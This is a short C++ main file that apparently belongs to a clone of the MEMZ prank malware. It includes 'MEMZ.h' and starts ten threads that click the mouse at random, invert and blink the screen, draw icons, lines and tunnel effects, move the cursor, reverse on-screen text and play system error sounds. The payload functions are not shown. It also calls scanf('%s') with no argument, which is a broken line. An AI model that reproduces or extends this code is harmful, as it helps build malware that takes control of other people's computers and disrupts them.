#include <thread>
#include "MEMZ.h" // Process Main 

using namespace std;

int main(){
    thread a(infclick); // Random Click
    thread b(infInvColor); // Invert Screen Color
    thread c(infIcon); // Random Draw Icons
    thread d(infCursor); // Random Move Mouse
    thread e(infChange); // Invert String
    thread f(inftunnel); // Draw Tunnel Effect 
    thread g(randomDraw); // Random Draw Lines
	thread h(infplay); // Play System Error Sounds
	thread i(infBlink); // Screen Blink
	thread j(InvertColor_slow); // Invert Screen Color (Slow) Like "Nepotonod"
    scanf("%s"); // Pause Program
}
